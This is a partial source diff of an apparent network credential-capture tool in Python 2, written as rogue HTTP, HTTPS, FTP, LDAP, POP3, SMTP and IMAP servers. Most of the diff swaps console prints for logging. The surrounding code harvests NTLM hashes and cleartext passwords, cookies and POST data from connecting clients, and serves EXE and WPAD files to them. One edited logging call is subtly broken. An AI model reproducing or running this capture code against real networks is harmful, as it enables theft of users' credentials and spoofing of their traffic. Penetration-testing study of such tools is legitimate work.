+        logging.warning('HTTP NTLMv2 Complete hash is :%s'%(WriteHash))
 
 def GrabCookie(data,host):
     Cookie = re.search('(Cookie:*.\=*)[^\r\n]*', data)
     if Cookie:
-        CookieStr = "[+]HTTP Cookie Header sent from: %s The Cookie is: \n%s"%(host,Cookie.group(0))
+        CookieStr = "HTTP Cookie Header sent from: %s The Cookie is: \n%s"%(host,Cookie.group(0))
         logging.warning(CookieStr)
         return Cookie.group(0)
     else:
@@ -1550,7 +1553,7 @@ def Basic_Ntlm(Basic):
         return IIS_Auth_401_Ans()
 
 def ServeEXE(data,client, Filename):
-    Message = "[+]Sent %s file sent to: %s."%(Filename,client)
+    Message = "Sent %s file sent to: %s."%(Filename,client)
     logging.warning(Message)
     with open (Filename, "rb") as bk:
         data = bk.read()
@@ -1581,17 +1584,17 @@ def GrabURL(data, host):
     POST = re.findall('(?<=POST )[^HTTP]*', data)
     POSTDATA = re.findall('(?<=\r\n\r\n)[^*]*', data)
     if GET:
-        HostStr = "[+]HTTP GET request from : %s. The HTTP URL requested was: %s"%(host, ''.join(GET))
+        HostStr = "HTTP GET request from : %s. The HTTP URL requested was: %s"%(host, ''.join(GET))
         logging.warning(HostStr)
-        print HostStr
+        #print HostStr
 
     if POST:
-        Host3Str = "[+]HTTP POST request from : %s. The HTTP URL requested was: %s"%(host,''.join(POST))
+        Host3Str = "HTTP POST request from : %s. The HTTP URL requested was: %s"%(host,''.join(POST))
         logging.warning(Host3Str)
-        print Host3Str
+        #print Host3Str
         if len(''.join(POSTDATA)) >2:
-            PostData = '[+]The HTTP POST DATA in this request was: %s'%(''.join(POSTDATA).strip())
-            print PostData
+            PostData = 'The HTTP POST DATA in this request was: %s'%(''.join(POSTDATA).strip())
+            #print PostData
             logging.warning(PostData)
 
 #Handle HTTP packet sequence.
@@ -1630,9 +1633,10 @@ def PacketSequence(data,client):
             NTLM_Auth= b64decode(''.join(Ntlm))
             ParseHTTPHash(NTLM_Auth,client)
             if WpadForcedAuth(Force_WPAD_Auth) and WpadCustom(data,client):
-                Message = "[+]WPAD (auth) file sent to: %s"%(client)
+                Message = "WPAD (auth) file sent to: %s"%(client)
                 if Verbose:
-                    print Message
+                    #print Message
+                    logging.warning(Message)
                 logging.warning(Message)
                 buffer1 = WpadCustom(data,client)
                 return buffer1
@@ -1646,13 +1650,13 @@ def PacketSequence(data,client):
         GrabURL(data,client)
         outfile = os.path.join(ResponderPATH,"HTTP-Clear-Text-Password-"+client+".txt")
         if PrintData(outfile,b64decode(''.join(BasicAuth))):
-            print "[+]HTTP-User & Password:", b64decode(''.join(BasicAuth))
+            logging.warning("HTTP-User & Password:", b64decode(''.join(BasicAuth)))
             WriteData(outfile,b64decode(''.join(BasicAuth)), b64decode(''.join(BasicAuth)))
-        logging.warning('[+]HTTP-User & Password: %s'%(b64decode(''.join(BasicAuth))))
+        logging.warning('HTTP-User & Password: %s'%(b64decode(''.join(BasicAuth))))
         if WpadForcedAuth(Force_WPAD_Auth) and WpadCustom(data,client):
-            Message = "[+]WPAD (auth) file sent to: %s"%(client)
+            Message = "WPAD (auth) file sent to: %s"%(client)
             if Verbose:
-                print Message
+                logging.warning(Message)
             logging.warning(Message)
             buffer1 = WpadCustom(data,client)
             return buffer1
@@ -1674,9 +1678,10 @@ class HTTP(BaseRequestHandler):
                 data = self.request.recv(8092)
                 buff = WpadCustom(data,self.client_address[0])
                 if buff and WpadForcedAuth(Force_WPAD_Auth) == False:
-                    Message = "[+]WPAD (no auth) file sent to: %s"%(self.client_address[0])
+                    Message = "WPAD (no auth) file sent to: %s"%(self.client_address[0])
                     if Verbose:
-                        print Message
+                        #print Message
+                        logging.warning(Message)
                     logging.warning(Message)
                     self.request.send(buff)
                 else:
@@ -1899,48 +1904,48 @@ def ParseHTTPSHash(data,client):
     NthashOffset = struct.unpack('<H',data[24:26])[0]
     NTHash = data[NthashOffset:NthashOffset+NthashLen].encode("hex").upper()
     if NthashLen == 24:
-        print "[+]HTTPS NTLMv1 hash captured from :",client
-        logging.warning('[+]HTTPS NTLMv1 hash captured from :%s'%(client))
+        #print "[+]HTTPS NTLMv1 hash captured from :",client
+        logging.warning('HTTPS NTLMv1 hash captured from :%s'%(client))
         NtHash = data[NthashOffset:NthashOffset+NthashLen].encode("hex").upper()
         HostNameLen = struct.unpack('<H',data[46:48])[0]
         HostNameOffset = struct.unpack('<H',data[48:50])[0]
         Hostname = data[HostNameOffset:HostNameOffset+HostNameLen].replace('\x00','')
-        print "Hostname is :", Hostname
-        logging.warning('[+]HTTPS NTLMv1 Hostname is :%s'%(Hostname))
+        #print "Hostname is :", Hostname
+        logging.warning('HTTPS NTLMv1 Hostname is :%s'%(Hostname))
         UserLen = struct.unpack('<H',data[36:38])[0]
         UserOffset = struct.unpack('<H',data[40:42])[0]
         User = data[UserOffset:UserOffset+UserLen].replace('\x00','')
-        print "User is :", data[UserOffset:UserOffset+UserLen].replace('\x00','')
-        logging.warning('[+]HTTPS NTLMv1 User is :%s'%(data[UserOffset:UserOffset+UserLen].replace('\x00','')))
+        #print "User is :", data[UserOffset:UserOffset+UserLen].replace('\x00','')
+        logging.warning('HTTPS NTLMv1 User is :%s'%(data[UserOffset:UserOffset+UserLen].replace('\x00','')))
         outfile = os.path.join(ResponderPATH,"HTTPS-NTLMv1-Client-"+client+".txt")
         WriteHash = User+"::"+Hostname+":"+LMHash+":"+NtHash+":"+NumChal
         WriteData(outfile,WriteHash, User+"::"+Hostname)
-        print "Complete hash is : ", WriteHash
-        logging.warning('[+]HTTPS NTLMv1 Complete hash is :%s'%(WriteHash))
+        #print "Complete hash is : ", WriteHash
+        logging.warning('HTTPS NTLMv1 Complete hash is :%s'%(WriteHash))
     if NthashLen > 24:
-        print "[+]HTTPS NTLMv2 hash captured from :",client
-        logging.warning('[+]HTTPS NTLMv2 hash captured from :%s'%(client))
+        #print "[+]HTTPS NTLMv2 hash captured from :",client
+        logging.warning('HTTPS NTLMv2 hash captured from :%s'%(client))
         NthashLen = 64
         DomainLen = struct.unpack('<H',data[28:30])[0]
         DomainOffset = struct.unpack('<H',data[32:34])[0]
         Domain = data[DomainOffset:DomainOffset+DomainLen].replace('\x00','')
-        print "Domain is : ", Domain
-        logging.warning('[+]HTTPS NTLMv2 Domain is :%s'%(Domain))
+        #print "Domain is : ", Domain
+        logging.warning('HTTPS NTLMv2 Domain is :%s'%(Domain))
         UserLen = struct.unpack('<H',data[36:38])[0]
         UserOffset = struct.unpack('<H',data[40:42])[0]
         User = data[UserOffset:UserOffset+UserLen].replace('\x00','')
-        print "User is :", User
-        logging.warning('[+]HTTPS NTLMv2 User is : %s'%(User))
+        #print "User is :", User
+        logging.warning('HTTPS NTLMv2 User is : %s'%(User))
         HostNameLen = struct.unpack('<H',data[44:46])[0]
         HostNameOffset = struct.unpack('<H',data[48:50])[0]
         HostName =  data[HostNameOffset:HostNameOffset+HostNameLen].replace('\x00','')
-        print "Hostname is :", HostName
-        logging.warning('[+]HTTPS NTLMv2 Hostname is :%s'%(HostName))
+        #print "Hostname is :", HostName
+        logging.warning('HTTPS NTLMv2 Hostname is :%s'%(HostName))
         outfile = os.path.join(ResponderPATH,"HTTPS-NTLMv2-Client-"+client+".txt")
         WriteHash = User+"::"+Domain+":"+NumChal+":"+NTHash[:32]+":"+NTHash[32:]
         WriteData(outfile,WriteHash, User+"::"+Domain)
-        print "Complete hash is : ", WriteHash
-        logging.warning('[+]HTTPS NTLMv2 Complete hash is :%s'%(WriteHash))
+        #print "Complete hash is : ", WriteHash
+        logging.warning('HTTPS NTLMv2 Complete hash is :%s'%(WriteHash))
 
 #Handle HTTPS packet sequence.
 def HTTPSPacketSequence(data,client):
@@ -1965,8 +1970,8 @@ def HTTPSPacketSequence(data,client):
         GrabCookie(data,client)
         outfile = os.path.join(ResponderPATH,"HTTPS-Clear-Text-Password-"+client+".txt")
         WriteData(outfile,b64decode(''.join(b)), b64decode(''.join(b)))
-        print "[+]HTTPS-User & Password:", b64decode(''.join(b))
-        logging.warning('[+]HTTPS-User & Password: %s'%(b64decode(''.join(b))))
+        #print "[+]HTTPS-User & Password:", b64decode(''.join(b))
+        logging.warning('HTTPS-User & Password: %s'%(b64decode(''.join(b))))
         buffer1 = str(IIS_Auth_Granted(Payload=HTMLToServe))
         return buffer1
 
@@ -2031,8 +2036,8 @@ class FTP(BaseRequestHandler):
             data = self.request.recv(1024)
             if data[0:4] == "USER":
                 User = data[5:].replace("\r\n","")
-                print "[+]FTP User: ", User
-                logging.warning('[+]FTP User: %s'%(User))
+                #print "[+]FTP User: ", User
+                logging.warning('FTP User: %s'%(User))
                 t = FTPPacket(Code="331",Message="User name okay, need password.")
                 self.request.send(str(t))
                 data = self.request.recv(1024)
@@ -2040,8 +2045,8 @@ class FTP(BaseRequestHandler):
                 Pass = data[5:].replace("\r\n","")
                 Outfile = os.path.join(ResponderPATH,"FTP-Clear-Text-Password-"+self.client_address[0]+".txt")
                 WriteData(Outfile,User+":"+Pass, User+":"+Pass)
-                print "[+]FTP Password is: ", Pass
-                logging.warning('[+]FTP Password is: %s'%(Pass))
+                #print "[+]FTP Password is: ", Pass
+                logging.warning('FTP Password is: %s'%(Pass))
                 t = FTPPacket(Code="530",Message="User not logged in.")
                 self.request.send(str(t))
                 data = self.request.recv(1024)
@@ -2086,11 +2091,11 @@ def ParseLDAPHash(data,client):
         writehash = User+"::"+Domain+":"+LMHash+":"+NtHash+":"+NumChal
         Outfile = os.path.join(ResponderPATH,"LDAP-NTLMv1-"+client+".txt")
         WriteData(Outfile,writehash,User+"::"+Domain)
-        print "[LDAP] NTLMv1 complete hash is :", writehash
+        #print "[LDAP] NTLMv1 complete hash is :", writehash
         logging.warning('[LDAP] NTLMv1 complete hash is :%s'%(writehash))
     if LMhashLen <2 :
-        Message = '[+]LDAP Anonymous NTLM authentication, ignoring..'
-        print Message
+        Message = 'LDAP Anonymous NTLM authentication, ignoring..'
+        #print Message
         logging.warning(Message)
 
 def ParseNTLM(data,client):
@@ -2118,7 +2123,7 @@ def ParseLDAPPacket(data,client):
             if AuthHeaderType == "\x80":
                 PassLen = struct.unpack('<b',data[20+UserDomainLen+1:20+UserDomainLen+2])[0]
                 Password = data[20+UserDomainLen+2:20+UserDomainLen+2+PassLen]
-                print '[LDAP]Clear Text User & Password is:', UserDomain+":"+Password
+                #print '[LDAP]Clear Text User & Password is:', UserDomain+":"+Password
                 outfile = os.path.join(ResponderPATH,"LDAP-Clear-Text-Password-"+client+".txt")
                 WriteData(outfile,'[LDAP]User: %s Password: %s'%(UserDomain,Password),'[LDAP]User: %s Password: %s'%(UserDomain,Password))
                 logging.warning('[LDAP]User: %s Password: %s'%(UserDomain,Password))
@@ -2129,7 +2134,7 @@ def ParseLDAPPacket(data,client):
             buff = ParseSearch(data)
             return buff
         else:
-            print '[LDAP]Operation not supported'
+            logging.warning('[LDAP]Operation not supported')
 
 #LDAP Server Class
 class LDAP(BaseRequestHandler):
@@ -2163,7 +2168,7 @@ class POP(BaseRequestHandler):
             data = self.request.recv(1024)
             if data[0:4] == "USER":
                 User = data[5:].replace("\r\n","")
-                logging.warning('[+]POP3 User: %s'%(User))
+                logging.warning('POP3 User: %s'%(User))
                 t = POPOKPacket()
                 self.request.send(str(t))
                 data = self.request.recv(1024)
@@ -2171,8 +2176,8 @@ class POP(BaseRequestHandler):
                 Pass = data[5:].replace("\r\n","")
                 Outfile = os.path.join(ResponderPATH,"POP3-Clear-Text-Password-"+self.client_address[0]+".txt")
                 WriteData(Outfile,User+":"+Pass, User+":"+Pass)
-                print "[+]POP3 Credentials from %s. User/Pass: %s:%s "%(self.client_address[0],User,Pass)
-                logging.warning("[+]POP3 Credentials from %s. User/Pass: %s:%s "%(self.client_address[0],User,Pass))
+                #print "[+]POP3 Credentials from %s. User/Pass: %s:%s "%(self.client_address[0],User,Pass)
+                logging.warning("POP3 Credentials from %s. User/Pass: %s:%s "%(self.client_address[0],User,Pass))
                 t = POPOKPacket()
                 self.request.send(str(t))
                 data = self.request.recv(1024)
@@ -2209,8 +2214,8 @@ class ESMTP(BaseRequestHandler):
                         Password = b64decode(data[:len(data)-2])
                         Outfile = os.path.join(ResponderPATH,"SMTP-Clear-Text-Password-"+self.client_address[0]+".txt")
                         WriteData(Outfile,Username+":"+Password, Username+":"+Password)
-                        print "[+]SMTP Credentials from %s. User/Pass: %s:%s "%(self.client_address[0],Username,Password)
-                        logging.warning("[+]SMTP Credentials from %s. User/Pass: %s:%s "%(self.client_address[0],Username,Password))
+                        #print "SMTP Credentials from %s. User/Pass: %s:%s "%(self.client_address[0],Username,Password)
+                        logging.warning("SMTP Credentials from %s. User/Pass: %s:%s "%(self.client_address[0],Username,Password))
 
         except Exception:
             pass
@@ -2236,8 +2241,8 @@ class IMAP(BaseRequestHandler):
                 Credentials = data[10:].strip()
                 Outfile = os.path.join(ResponderPATH,"IMAP-Clear-Text-Password-"+self.client_address[0]+".txt")
                 WriteData(Outfile,Credentials, Credentials)
-                print '[+]IMAP Credentials from %s. ("User" "Pass"): %s'%(self.client_address[0],Credentials)
-                logging.warning('[+]IMAP Credentials from %s. ("User" "Pass"): %s'%(self.client_address[0],Credentials))
+                #print '[+]IMAP Credentials from %s. ("User" "Pass"): %s'%(self.client_address[0],Credentials)
+                logging.warning('IMAP Credentials from %s. ("User" "Pass"): %s'%(self.client_address[0],Credentials))
                 self.request.send(str(ditchthisconnection()))
                 data = self.request.recv(1024)
 
